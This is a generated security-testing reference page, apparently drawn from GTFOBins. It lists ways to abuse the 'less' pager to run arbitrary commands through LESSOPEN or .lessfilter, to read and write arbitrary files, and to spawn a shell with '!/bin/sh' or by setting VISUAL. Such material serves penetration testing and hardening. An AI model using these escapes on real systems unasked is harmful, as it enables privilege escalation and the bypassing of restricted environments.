---
parsed_by: focuslocust
source: commands
type: generated
---
# less Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## less

Tool page: [less](../../tools/linux/less.md)

### command

```text
cp /path/to/command ~/.lessfilter
less /etc/hosts
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### command

```text
LESSOPEN='/path/to/command # %s' less /etc/hosts
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
less /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
less /etc/hosts
:e /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA | less
s/path/to/output-file
q
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### inherit

```text
less /etc/hosts
v
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### shell

```text
less /etc/hosts
!/bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### shell

```text
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |

### shell

```text
VISUAL='/bin/sh -s --' less /etc/hosts
v
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/less` |
| Evidence | Function example preserved from source parser. |
